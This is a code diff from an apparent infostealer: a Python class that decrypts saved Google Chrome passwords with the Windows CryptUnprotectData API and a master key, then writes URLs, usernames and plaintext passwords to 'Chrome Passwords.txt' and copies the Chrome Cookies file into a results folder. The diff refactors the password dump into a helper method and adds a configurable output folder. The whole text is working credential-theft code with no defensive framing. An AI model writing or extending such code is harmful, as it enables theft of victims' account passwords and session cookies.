@@ -11,9 +11,10 @@ from win32crypt import CryptUnprotectData
 
 class Chrome:
 
-    def __init__(self, storage_path: str):
+    def __init__(self, storage_path: str, storage_folder: str):
 
         self.storage_path = storage_path
+        self.storage_folder = storage_folder
 
         self.state_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\Local State'
         self.cookies_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\default\Cookies'
@@ -36,6 +37,26 @@ class Chrome:
 
             return "Old version"
 
+    def __write_passwords(self, cursor, master_key):
+
+        with open(f"{self.storage_path}{self.storage_folder}Chrome Passwords.txt", "a", encoding='utf-8') as passwords:
+
+            results = cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall()
+
+            for result in results:
+
+                password = self.__decrypt_password(result[2], master_key)
+
+                if (result[0], result[1], password) != ("", "", ""):
+
+                    passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
+
+                else:
+
+                    continue
+
+        passwords.close()
+
     def run(self):
 
         try:
@@ -49,28 +70,15 @@ class Chrome:
 
                     cursor = connection.cursor()
 
-                    with open(self.storage_path + "results/Chrome Passwords.txt", "a", encoding='utf-8') as passwords:
+                    self.__write_passwords(cursor, master_key)
 
-                        for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
-
-                            password = self.__decrypt_password(result[2], master_key)
-
-                            if (result[0], result[1], password) != ("", "", ""):
-
-                                passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
-
-                            else:
-
-                                continue
-
-                    passwords.close()
                     cursor.close()
 
                 connection.close()
 
             if (path.exists(self.cookies_path)) is True:
 
-                shutil.copyfile(self.cookies_path, self.storage_path + "results/Chrome Cookies", follow_symlinks=True)
+                shutil.copyfile(self.cookies_path, f"{self.storage_path}{self.storage_folder}Chrome Cookies", follow_symlinks=True)
 
             remove(self.storage_path + "Chrome.db")
 
